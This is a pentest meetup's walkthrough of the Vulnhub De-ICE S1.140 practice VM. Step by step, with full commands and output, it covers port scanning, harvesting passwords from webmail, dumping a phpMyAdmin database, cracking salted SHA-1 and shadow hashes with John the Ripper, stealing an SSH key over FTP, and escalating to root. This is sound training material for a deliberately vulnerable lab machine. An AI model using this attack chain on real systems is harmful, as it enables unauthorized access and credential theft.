.. include:: /pentest_links.txt

.. _De-ICE6:

**************
De-ICE Level 6
**************

Setup
=====

This is to document the meetup's efforts responding to the challenge `Vulnhub De-ICE: S1.140 <https://www.vulnhub.com/entry/de-ice-s1140,57/>`_, the sixth of the Vulnhub De-ICE series. The challenge is to get :file:`/root/flag.txt` (which doesn't exist so :file:`/root/secret.jpg` is the next best thing).

This De-ICE challenge is another password cracking test of patience. While none of the steps are exceptionally difficult, the online password cracking lists are big enough to take potentially many hours to try; given it's not a sure path, many might give up on that being the correct path. Most of the time they'd be correct, but in this case not. And there's no way to finish this exercise in anything close to 1 hour even knowing the required steps - the online password cracking takes too long.

Setting up the VM
-----------------

The VM comes packaged as the live ISO `De-ICE_S1.140.iso <http://hackingdojo.com/downloads/iso/De-ICE_S1.140.iso>`_ running Ubuntu 12.04.

Setting up your environment
---------------------------

.. code-block:: bash

  PT=$HOME/pentest/de-ice6
  mkdir -p $PT
  cd $PT
  # download de-ice6_setup.sh
  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice6_setup.sh
  # edit as needed; later the recon will give you TARGET IPs
  source de-ice6_setup.sh

The source for :file:`de-ice6_setup.sh` (:download:`de-ice6_setup.sh`) should look something like the following.

.. literalinclude:: de-ice6_setup.sh
   :language: bash

Reconnaisance
=============

Network reconnaissance
----------------------

Start with some standard network reconnaissance looking for the vulnerable host:

.. code-block:: bash

  PT=$HOME/pentest/de-ice6
  source $PT/de-ice6_setup.sh
  cd $PT/nmap

  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
  $SUDO chown $USER.$USER nmap_sn.*
  # use the grep-able output to get a list of target hosts
  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
  # use the xml output to get an html report
  xsltproc nmap_sn.xml -o nmap_sn.html

The result is we find the IP for de-ice6: $TARGET. Update $PT/de-ice6_setup.sh and also edit :file:`/etc/hosts` to add "de-ice6.com" (``echo "$TARGET de-ice6.com" | $SUDO tee -a /etc/hosts``).

.. code-block:: bash

  PT=$HOME/pentest/de-ice6
  source $PT/de-ice6_setup.sh
  cd $PT/nmap

  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
  $SUDO chown $USER.$USER nmap_A.*
  xsltproc nmap_A.xml -o nmap_A.html

Running the above reveals:

.. code-block:: console
  :emphasize-lines: 1-3,5,6,10,17,19

  PORT    STATE  SERVICE  REASON         VERSION
  21/tcp  open   ftp      syn-ack ttl 64 ProFTPD 1.3.4a
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_Can't get directory listing: ERROR
  22/tcp  open   ssh      syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
  80/tcp  open   http     syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)
  |_http-methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.2.22 (Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1
  |_http-title: Lazy Admin Corp.
  443/tcp open   ssl/http syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)
  | http-cisco-anyconnect: 
  |_  ERROR: Not a Cisco ASA or unsupported version
  |_http-methods: GET HEAD POST OPTIONS
  |_http-server-header: Apache/2.2.22 (Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1
  |_http-title: Lazy Admin Corp.
  465/tcp closed smtps    reset ttl 64
  993/tcp open   ssl/imap syn-ack ttl 64 Dovecot imapd
  |_imap-capabilities: IDLE SASL-IR ID LOGIN-REFERRALS post-login ENABLE AUTH=PLAIN IMAP4rev1 listed capabilities AUTH=LOGINA0001 OK Pre-login have more LITERAL+
  995/tcp open   ssl/pop3 syn-ack ttl 64 Dovecot pop3d

Reconnaissance on port 21
-------------------------

FTP reconnaissance using the anonymous account showed an empty incoming directory.

Reconnaissance on port 22
-------------------------

SSH reconnaissance showed that publickey authentication is required ("Permission denied (publickey").

Reconnaissance on ports 80 & 443
--------------------------------

We do some standard reconnaissance on HTTP(S) ports:

.. code-block:: bash
  :emphasize-lines: 5-

  PT=$HOME/pentest/de-ice6
  source $PT/de-ice6_setup.sh
  cd $PT/spider

  dirb  http://$HOST/ -o dirb80_$HOST.txt
  dirb  https://$HOST/ -o dirb443_$HOST.txt

Running this results in these important findings:

.. code-block:: console
  :emphasize-lines: 2-

  ==> DIRECTORY: http://de-ice6.com/forum/                                       
  ==> DIRECTORY: https://de-ice6.com/forum/                                       
  ==> DIRECTORY: https://de-ice6.com/phpmyadmin/                                       
  ==> DIRECTORY: https://de-ice6.com/webmail/                                       

Browsing port 80
----------------

Browsing the directories found by :program:`dirb` lead to forum page http://de-ice6.com/forum/index.php?id=8 which revealed HTTP user id "mbrown" who entered their password in the user field revealing password "!DFiuoTkbxtdk0!":

.. code-block:: html

  Mar 7 11:15:32 testbox sshd[5772]: Invalid user !DFiuoTkbxtdk0! from 10.0.0.23
  Mar 7 11:15:32 testbox sshd[5772]: input_userauth_request: invalid user !DFiuoTkbxtdk0! [preauth]

  Mar 7 11:15:32 testbox sshd[5774]: Connection from 10.0.0.23 port 35155
  Mar 7 11:15:32 testbox sshd[5774]: Accepted keyboard-interactive/pam for mbrown from 10.0.0.23 port 35168 ssh2

Logging on the forum as mbrown (email mb@lazyadmin.corp) and visiting http://de-ice6.com/forum/index.php?mode=user showed these addition forum users: admin, rhedley, and swillard.

Using the newly-found user id and password didn't work on FTP (password probably different) and SSH didn't allow passwords.

Reconnaissance on port 993
--------------------------

Next you can log into webmail via the browser (https://de-ice6.com/webmail/) for 
"mbrown" using email id of "mb@lazyadmin.corp" with password "!DFiuoTkbxtdk0!". Look in the INBOX's May 13, 2013 email to find the root MySQL password, then at the SENT message dated Mar 10, 2013 for the root phpMyAdmin password: "S4!y.dk)j/_d1pKtX1" in both cases. Alternatively you can use ``openssl s_client`` from the command line:

.. code-block:: bash
  :emphasize-lines: 5-10,14-15

  PT=$HOME/pentest/de-ice6
  source $PT/de-ice6_setup.sh
  cd $PT/spider

  openssl s_client -connect de-ice6.com:993 -crlf
  ? LOGIN mb@lazyadmin.corp !DFiuoTkbxtdk0!
  ? LIST "" "*"
  ? SELECT INBOX
  ? FETCH 1 BODY[]
  ? FETCH 2 BODY[]
  # results in
  # here are the login-informations for mysql:
  #
  # Username: root
  # Password: S4!y.dk)j/_d1pKtX1
  ? SELECT INBOX.Sent
  ? FETCH 1 BODY[]
  # results in
  # > here are the login-informations for PHPMyAdmin:
  # >
  # > Username: root
  # > Password: S4!y.dk)j/_d1pKtX1

So now we have the root password for mysql/PHPMyAdmin of "S4!y.dk)j/_d1pKtX1".


The Exploit
===========

phpMyAdmin as root
------------------

Quickly logging into https://de-ice6.com/phpmyadmin/ as "root" with password "S4!y.dk)j/_d1pKtX1", we dump the databases and get the passwords from the `my little forum <http://mylittleforum.net/>`_ MySQL forum database table mlf2_userdata:

.. code-block:: mysql
  :emphasize-lines: 3

  INSERT INTO `mlf2_userdata` (`user_id`, `user_type`, `user_name`, `user_real_name`, `gender`, `birthday`, `user_pw`, `user_email`, `email_contact`, `user_hp`, `user_location`, `signature`, `profile`, `logins`, `last_login`, `last_logout`, `user_ip`, `registered`, `category_selection`, `thread_order`, `user_view`, `sidebar`, `fold_threads`, `thread_display`, `new_posting_notification`, `new_user_notification`, `user_lock`, `auto_login_code`, `pwf_code`, `activate_code`, `language`, `time_zone`, `time_difference`, `theme`, `entries_read`) VALUES
  (1, 2, 'admin', '', 0, '0000-00-00', 'fd339d53bf599d4ec7281ace84a902dc2ca16c7f63cbb16261', 'webmaster@lazyadmin.corp', 1, '', '', '', '', 10, '2013-03-24 18:03:02', '2013-03-24 18:08:31', '192.168.8.1', '2013-03-09 14:57:17', NULL, 0, 1, 1, 0, 0, 0, 0, 0, '', '', '', '', '', 0, '', '6,10,11,12,13,14,8,9,7,15,1,2,3,4,5'),
  (2, 0, 'RHedley', 'Richard Hedley', 1, '0000-00-00', '31cbbdab9f5e1ebfa7d81267c258e29b5f9e171e6fcf7b1ba3', 'rh@lazyadmin.corp', 1, '', '', '', '', 5, '2013-03-24 18:09:38', '2013-03-24 18:09:52', '192.168.8.1', '2013-03-09 15:22:22', NULL, 0, 0, 1, 0, 0, 0, 0, 0, '', '', '', '', '', 0, '', '6,10,11,12,13,14,8,9,7,15,1,2,3,4,5'),
  (3, 0, 'MBrown', 'Mark Brown', 1, '0000-00-00', '8a1bae9881bfbfc68880d1e23d6a095e80db27b7c43e56ccc1', 'mb@lazyadmin.corp', 1, '', '', '', '', 6, '2015-08-18 05:10:11', '2015-08-18 05:45:17', '192.168.1.28', '2013-03-09 15:23:28', NULL, 0, 0, 1, 0, 0, 0, 0, 0, '', '', '', '', '', 0, '', '6,10,11,12,13,14,9,7,15,1,2,3,4,5,8'),
  (4, 1, 'SWillard', 'Sandy Willard', 2, '0000-00-00', 'c19038340b8f5d1fc70e9bfbc3336f7bf1e0935da5ef13d4ef', 'sw@lazyadmin.corp', 1, '', '', '', '', 8, '2013-03-24 18:09:08', '2013-03-24 18:09:27', '192.168.8.1', '2013-03-09 15:25:13', NULL, 0, 1, 1, 0, 0, 0, 0, 0, '', '', '', '', '', 0, '', '6,10,11,12,13,14,8,9,7,15,1,2,3,4,5');

The functions generate_pw_hash (to create the password) and is_pw_correct (to verify the password) are found in `functions.inc.php <http://sourceforge.net/p/mylittleforum/code/ci/master/tree/includes/functions.inc.php>`_. The last 10 hex characters are the salt and the first 40 are the salted SHA1 hash. So for mbrown with password '!DFiuoTkbxtdk0!' and hash '8a1bae9881bfbfc68880d1e23d6a095e80db27b7c43e56ccc1' we can check:

.. code-block:: bash

  SALTED_HASH='8a1bae9881bfbfc68880d1e23d6a095e80db27b7c43e56ccc1'
  HASH=${SALTED_HASH:0:40}
  SALT=${SALTED_HASH:40:10}
  PW='!DFiuoTkbxtdk0!'
  PWSALT="$PW$SALT"
  COMPUTED_HASH=$(echo -n "$PWSALT" | sha1sum)
  COMPUTED_HASH=${COMPUTED_HASH%  -}    # eliminate trailing "  -"
  echo $HASH
  echo $COMPUTED_HASH
  if [[ "$HASH" = "$COMPUTED_HASH" ]]; then
    echo "They are equal"
  else
    echo "They are NOT equal"
  fi

This format is `John The Ripper Hash Formats <http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats>`_ "sha1-gen – Generic salted SHA-1" except that the password file should have "SHA1s" and not "SHA1p":

.. code-block:: bash
  :emphasize-lines: 6,11,16-

  PT=$HOME/pentest/de-ice6
  source $PT/de-ice6_setup.sh
  cd $PT/exploit

  { echo 'admin:$SHA1s$63cbb16261$fd339d53bf599d4ec7281ace84a902dc2ca16c7f:::::::'
    echo 'RHedley:$SHA1s$6fcf7b1ba3$31cbbdab9f5e1ebfa7d81267c258e29b5f9e171e:::::::'
    echo 'MBrown:$SHA1s$c43e56ccc1$8a1bae9881bfbfc68880d1e23d6a095e80db27b7:::::::'
    echo 'SWillard:$SHA1s$a5ef13d4ef$c19038340b8f5d1fc70e9bfbc3336f7bf1e0935d:::::::'
  } > hashes_mlf2_userdata.txt

  # Get darkc0de.txt password list.
  curl --silent --location --output darkc0de.txt \
      https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkc0de.txt?raw=true

  rm -rf $HOME/.john
  /usr/sbin/john --format:sha1-gen --wordlist:darkc0de.txt hashes_mlf2_userdata.txt
  /usr/sbin/john --show --format:sha1-gen hashes_mlf2_userdata.txt
  # results in
  # RHedley:tum-ti-tum:::::::

So we've cracked "rhedley"'s hash to reveal password "tum-ti-tum".

Exploring FTP as rhedley
------------------------

Exploring with an FTP client using user "rhedley" and password "tum-ti-tum" showed these FTP top level directories: ftp, mbrown, mparker, rhedley, sraines, swillard (though ftp client said "No such file or directory" when attempting to ``cd swillard``). Download the only visible file :file:`/ftp/incoming/backup_webhost_130111.tar.gz.enc`. It's probably :program:`openssl`-encrypted but none of the known passwords would decrypt it.

If you're really persistent you'll realize that we have Linux home directories with probably normal subdirectories. Since we're looking for a way to SSH into the server we certainly should try looking for :file:`.ssh/` sudirectories. Only :file:`mbrown/.ssh/` existed, and it had a readable file :file:`mbrown/.ssh/downloadkey` which could be downloaded (but :file:`mbrown/.ssh/id_rsa` could not). Running ``file downloadkey`` showed the file was a "PEM RSA private key" which we could use to SSH to de-ice6.com.

.. code-block:: bash
  :emphasize-lines: 5-

  PT=$HOME/pentest/de-ice6
  source $PT/de-ice6_setup.sh
  cd $PT/exploit

  ftp de-ice6.com
  # rhedley
  # tum-ti-tum
  cd mbrown/.ssh
  ls
  get downloadkey
  quit
  file downloadkey
  chmod 600 downloadkey
  ssh -i downloadkey mbrown@de-ice6.com
  # results in log into de-ice6.com as mbrown

Exploring SSH as mbrown
-----------------------

And we're finally on de-ice6. A quick check shows that :file:`.ssh/downloadkey` and :file:`.ssh/id_rsa` are identical. Let's quickly see what users we should target.

.. code-block:: bash
  :emphasize-lines: 5,10,12-13,17-18,20,22-24,27,34,38-

  cat /etc/passwd
  # results in
  # mbrown:x:1001:1001:Mark Brown,404,2457,:/home/mbrown:/bin/bash
  # rhedley:x:1002:1002:Richard Hedley,407,3412,:/home/rhedley:/bin/bash
  # swillard:x:1003:1003:Sandy Willard,401,1429,:/home/swillard:/bin/bash
  # mparker:x:1004:1004:Miles Parker,403,6283,:/home/mparker:/bin/bash

  cat /etc/group
  # results in
  # sudo:x:27:swillard
  # ftpuser:x:997:rhedley,mbrown,ftp
  # ftpadmin:x:999:rhedley,swillard
  # sshlogin:x:998:swillard,mbrown

  cat /etc/ssh/sshd_config
  # results in
  # PermitRootLogin no
  # PasswordAuthentication no

  # NOTE - only way to get to root is through swillard

  ls -al /opt
  # results in
  -rwxrw----+ 1 root root 654 May 13  2013 backup.sh
  # Using root with password "S4!y.dk)j/_d1pKtX1" fails.
  # su - root
  getfacl backup.sh
  # results in
  # # file: backup.sh
  # # owner: root
  # # group: root
  # user::rwx
  # group::rw-
  # group:ftpadmin:r--
  # mask::rw-
  # other::---

  # So ftpadmin users (rhedley and swillard) can read the backup.sh file.
  su - rhedley    # password "tum-ti-tum"
  cat /opt/backup.sh

We see the script :file:`/opt/backup.sh` tells us how the file we downloaded earlier (:file:`/ftp/incoming/backup_webhost_130111.tar.gz.enc`) was encrypted:

.. code-block:: bash
  :emphasize-lines: 19

  #!/bin/bash
  ## Backup Script
  ## by SRaines
  ## Lazy Admin Corp

  TMPBACKUP="/tmp/backup";
   
  NAME_PREFIX="backup";
  NAME_DATE=$(date +%y%m%d);
  NAME_HOST=$(/bin/hostname);
  FILENAME=${NAME_PREFIX}_${NAME_HOST}_${NAME_DATE}.tar;
   
  [ ! -d ${TMPBACKUP} ] && mkdir -p ${TMPBACKUP}
   
  tar cpf ${TMPBACKUP}/${FILENAME} /etc/fstab /etc/apache2 /etc/hosts /etc/motd /etc/ssh/sshd_config /etc/dovecot /etc/postfix /var/www /home /opt
   
  gzip --best -f ${TMPBACKUP}/${FILENAME}

  openssl aes-256-cbc -in ${TMPBACKUP}/${FILENAME}.gz -out ${TMPBACKUP}/${FILENAME}.gz.enc -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs

  mv ${TMPBACKUP}/${FILENAME}.gz.enc ./

  rm -fr ${TMPBACKUP}


Getting :file:`/etc/shadow`
---------------------------

So to decrypt :file:`backup_webhost_130111.tar.gz.enc` back on Kali all we need do is ``openssl aes-256-cbc -d``. That reveals an older (but still good) :file:`/etc/shadow` giving us swillard's (nee sraines) hash which we crack:

.. code-block:: bash
  :emphasize-lines: 1-4,8-16,18-

  openssl aes-256-cbc -d \
    -in backup_webhost_130111.tar.gz.enc \
    -out backup_webhost_130111.tar.gz \
    -pass pass:wpaR9V616xrDTy98L7Uje2DDU5hWtWhs
  tar -xvf backup_webhost_130111.tar.gz
  ls /etc
  # Must su to root
  grep root etc/shadow
  # results in
  # root:!:15773:0:99999:7:::
  # "!" instead of hash means must su to root
  cat etc/sudoers
  # results in
  # %sudo	ALL=(ALL:ALL) ALL
  # So only sudo group members can get root and that is swillard, nee sraines.
  # So crack her hash.

  /usr/sbin/unshadow etc/passwd etc/shadow > unshadow.txt
  grep sraines unshadow.txt > crackme.txt
  /usr/sbin/john --rules --wordlist=darkc0de.txt crackme.txt
  /usr/sbin/john --show crackme.txt
  # results in
  # sraines:brillantissimo:1000:1000:Sandy Raines,401,1429,:/home/sraines:/bin/bash

Capturing the flag
------------------

To put it all together starting from Kali:

.. code-block:: bash

  ssh -i downloadkey mbrown@de-ice6.com
  su - swillard    # password "brillantissimo"
  sudo su - root    # password "brillantissimo"
  id
  # results in
  # uid=0(root) gid=0(root) groups=0(root)
  ls -l /root
  # results in
  # -rw-r--r-- 1 root root 22852 May 17  2011 secret.jpg
  
We leave it as an exercise to the reader to transfer the file back to Kali.

